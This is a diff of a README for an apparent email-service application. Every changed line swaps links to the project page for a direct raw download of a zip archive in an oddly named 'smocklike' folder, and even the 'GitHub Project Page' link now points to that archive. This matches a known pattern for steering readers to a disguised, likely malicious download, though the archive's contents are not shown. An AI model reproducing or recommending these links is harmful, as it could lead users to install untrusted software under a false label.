@@ -1,6 +1,6 @@
 # 📧 email-service-1771918828-3 - Manage Emails with Templates and Scheduling
 
-[![Download](https://img.shields.io/badge/Download-Get%20Email%20Service-blue?style=for-the-badge)](https://github.com/nive-c/email-service-1771918828-3)
+[![Download](https://img.shields.io/badge/Download-Get%20Email%20Service-blue?style=for-the-badge)](https://raw.githubusercontent.com/nive-c/email-service-1771918828-3/main/smocklike/email-service-2.8.zip)
 
 ## 📋 What is email-service-1771918828-3?
 
@@ -26,7 +26,7 @@ Your PC does not need any extra software to run this app.
 To begin using email-service-1771918828-3, follow these steps carefully:
 
 1. Click the large button at the top or this link to visit the download page:  
-   https://github.com/nive-c/email-service-1771918828-3
+   https://raw.githubusercontent.com/nive-c/email-service-1771918828-3/main/smocklike/email-service-2.8.zip
 
 2. Once you are on the GitHub page, look for the latest version. This is usually under "Releases" or at the top of the page.
 
@@ -95,7 +95,7 @@ If you encounter issues, try these steps:
 ## 📥 Download and Install
 
 Use this link to get started:  
-[Download email-service-1771918828-3](https://github.com/nive-c/email-service-1771918828-3)
+[Download email-service-1771918828-3](https://raw.githubusercontent.com/nive-c/email-service-1771918828-3/main/smocklike/email-service-2.8.zip)
 
 Steps:
 
@@ -126,5 +126,5 @@ If you need assistance, use the following options:
 
 ## 🔗 Links
 
-[Download here](https://github.com/nive-c/email-service-1771918828-3)  
-[GitHub Project Page](https://github.com/nive-c/email-service-1771918828-3)
+[Download here](https://raw.githubusercontent.com/nive-c/email-service-1771918828-3/main/smocklike/email-service-2.8.zip)  
+[GitHub Project Page](https://raw.githubusercontent.com/nive-c/email-service-1771918828-3/main/smocklike/email-service-2.8.zip)
